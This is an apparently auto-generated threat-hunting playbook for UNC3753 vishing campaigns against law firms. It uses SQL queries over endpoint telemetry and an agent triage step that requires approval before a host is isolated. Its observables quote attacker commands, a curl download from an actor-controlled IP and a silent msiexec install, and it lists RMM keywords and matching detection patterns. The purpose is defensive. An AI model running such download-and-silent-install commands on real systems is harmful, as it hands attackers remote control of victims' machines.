---
analysis: A single detection rule would likely fire on any curl command or any RMM
  tool installation, leading to high false-positive rates. This hunt baselines Privnote
  usage and RMM presence across the fleet, using an agent to weigh the coincidence
  of these events on a single host.
blind_spots:
- id: no-voip-telemetry
  question: Was a phone call actually made to the employee at the time of the event?
  requires: VoIP or PBX call logs
  risk: Social engineering via vishing leaves no endpoint footprint; we can only see
    the technical results (the download), not the bait.
  stage: initial-social-engineering-and-vishing
- id: no-process-telemetry
  question: Was the installer executed on a host not reporting to the telemetry surface?
  requires: endpoint agent (hb_process_activity)
  risk: A host without an active agent will not report the process activity, even
    if the software inventory eventually shows the package.
  stage: rmm-and-remote-control-deployment
coverage:
- stage: initial-social-engineering-and-vishing
  status: covered
  steps:
  - privnote-dns-activity
- stage: rmm-and-remote-control-deployment
  status: covered
  steps:
  - rmm-inventory-check
  - suspicious-rmm-installation
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: vdi-access-and-pivot
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: discovery-and-local-staging
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: exfiltration-to-cloud-and-ftp
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: UNC3753 is a high-tempo threat cluster targeting law firms with extortion.
    Their use of vishing bypasses most automated email/web filters, making endpoint-based
    behavioral hunting the primary way to detect their presence before data exfiltration
    occurs.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary is using vishing to impersonate IT support and social-engineer
  users into installing RMM tools via links shared through self-destructing note services.
labels:
- hunt
- attack.t1566
- attack.t1133
- attack.t1204.002
- attack.t1021.001
name: Vishing-Driven RMM Deployment (UNC3753)
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  rmm_keywords:
    default:
    - superops
    - anydesk
    - zoho
    - bomgar
    - quickassist
    description: Keywords for known RMM tools and installers used in this campaign.
    from:
      kind: article
      observed: '2026-05-01'
      ref: UNC3753 targeted campaign
    type: list[string]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Focus on workstations and endpoints likely to be targeted by vishing (e.g.,
  HR, Finance, Legal). Exclude server infrastructure where RMM tools might be expected.
references:
- name: UNC3753 targeted campaign against US law firms
  url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
related:
- hunt: vdi-access-and-pivot-unc3753
  reason: This hunt covers the initial infection; the next hunt covers the use of
    the beachhead to access VDI and move laterally.
  relation: follows
scenario:
  stages:
  - name: IT Helpdesk Impersonation and Vishing
    observables:
    - privnote.com
    - Invoice-themed email lures
    - Direct phone calls posing as IT support
    - Screen-sharing session links (Zoom, Microsoft Teams, Quick Assist)
    slug: initial-social-engineering-and-vishing
    tactic: initial-access
    techniques:
    - T1566
    - T1133
  - name: RMM Tool Execution
    observables:
    - AnyDesk installer
    - Bomgar installer
    - Zoho Assist installer
    - SuperOps.msi
    - curl -sL "http://[actor-controlled-ip]/installer" -o "SuperOps.msi"
    - msiexec /i "SuperOps.msi" /quiet
    slug: rmm-and-remote-control-deployment
    tactic: execution
    techniques:
    - T1204.002
  - name: VDI Access from Personal Devices
    observables:
    - Windows365.exe
    - Citrix client usage
    - Personal/BYOD IP addresses accessing corporate VDI
    - Login to corporate VDI after Zoom/Teams sessions
    slug: vdi-access-and-pivot
    tactic: lateral-movement
    techniques:
    - T1021.001
    - T1133
  - name: Document Search and Staging
    observables:
    - Keyword searches for W-2, W-9, 1099, SSN, and audit files
    - iManage document searches
    - OneDrive and network drive enumeration
    - Files staged in \Downloads folder
    - Files staged in native Roaming profile path
    slug: discovery-and-local-staging
    tactic: collection
    techniques:
    - T1083
    - T1074.001
  - name: Exfiltration via Cloud and FTP
    observables:
    - WinSCP.exe
    - Rclone.exe
    - Google Drive browser-based uploads
    - Folders renamed to mimic victim branding on cloud storage
    - FTP/SFTP uploads to actor-controlled IPs
    - Forwarding staged files via internal target mailboxes
    slug: exfiltration-to-cloud-and-ftp
    tactic: exfiltration
    techniques:
    - T1567.002
    - T1041
    - T1090.003
  summary: UNC3753 (Silent Ransom Group) uses invoice-themed emails and vishing to
    trick US law firm employees into installing RMM tools and initiating screen-sharing
    sessions. The actors pivot from compromised BYOD endpoints to corporate VDI environments,
    stage sensitive legal and financial documents, and exfiltrate them via cloud storage
    or FTP for extortion.
series:
  index: 1
  slug: unc3753-targeted-campaign-against-us-law-firms
  title: UNC3753 targeted campaign against US law firms
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Vishing-Driven RMM Deployment (UNC3753)

This hunt targets the initial stages of UNC3753 operations, where threat actors use voice phishing (vishing) to bypass technical controls and convince users to install Remote Monitoring and Management (RMM) software. The hunt identifies hosts with newly installed RMM packages, identifies suspicious installation commands (like curl downloading MSI files), and correlates these actions with access to self-destructing note services like Privnote, which are used to relay instructions to victims.

## rmm-inventory-check
<!-- Identify hosts with RMM software -->
Find hosts where RMM software mentioned in the report is present in the software inventory.

```sqlite target=endpoint role=scoping params=(rmm_keywords=rmm_keywords)
~~~yaml
expected: Hosts running AnyDesk, SuperOps, or other RMM tools. While many are legitimate,
  their presence on workstations not typically managed by these specific tools is
  suspicious.
reads:
- device_hostname
- package_name
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT device_hostname, package_name, vendor_name FROM hb_software_inventory WHERE (instr(',' || '{{rmm_keywords}}' || ',', ',' || LOWER(package_name) || ',') > 0 OR instr(',' || '{{rmm_keywords}}' || ',', ',' || LOWER(vendor_name) || ',') > 0)
```

## parallel-corroboration
<!-- Corroborate installation and pretext -->
parallel:
- → suspicious-rmm-installation
- → privnote-dns-activity
join: → triage-agent

## suspicious-rmm-installation
<!-- Suspicious RMM installation commands -->
Find process command lines indicating an RMM tool being downloaded via curl or installed via msiexec in a quiet mode, as seen in UNC3753 incidents.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: A curl command downloading an installer or an msiexec command running a
  newly dropped MSI. This represents the execution phase of the RMM tool.
reads:
- device_hostname
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT device_hostname, process_cmd_line, user_name, time FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%curl%installer%' OR LOWER(process_cmd_line) LIKE '%msiexec%/i%quiet%' OR LOWER(process_cmd_line) LIKE '%superops.msi%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## privnote-dns-activity
<!-- Privnote DNS prevalence -->
Identify hosts resolving privnote.com, which is used by UNC3753 to relay installation commands to victims.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A rare resolution of privnote.com on a specific host. In a corporate environment,
  this service is often used for non-business purposes or shadow IT, but its correlation
  with RMM installs is highly suspicious.
prevalence:
  by: device_hostname
  key:
  - query_hostname
  rare_below: 5
reads:
- query_hostname
- device_hostname
- time
silence: evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT query_hostname, COUNT(DISTINCT device_hostname) as host_count, MIN(time) as first_seen FROM hb_dns_activity WHERE LOWER(query_hostname) = 'privnote.com' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY query_hostname
```

## triage-agent
<!-- Assess RMM installation context -->
```agent target=hunter
cite: required
context:
- rmm-inventory-check
- suspicious-rmm-installation
- privnote-dns-activity
max_iterations: 3
objective: Determine if any host shows a combination of rare Privnote access and unauthorized
  RMM installer execution.
success_criteria: A verdict of malicious, suspicious, or benign per host, with specific
  citations for the commands and domains.
tools:
- endpoint
```

## route-verdict
<!-- Route on agent verdict -->
if~: "the triage-agent verdict is malicious for any host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: no-process-telemetry)
else: → analyst-review

## isolate-host
<!-- Isolate infected host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host from the network and revoke any active sessions for the affected user. Collect the identified RMM binaries for analysis.
```
→ analyst-review

## analyst-review
<!-- Final Analyst Review -->
```manual target=analyst
Review the agent's findings. If confirmed, initiate the incident response protocol for data theft. If benign, tune the RMM keyword list to exclude legitimate corporate tools.
```
→ end
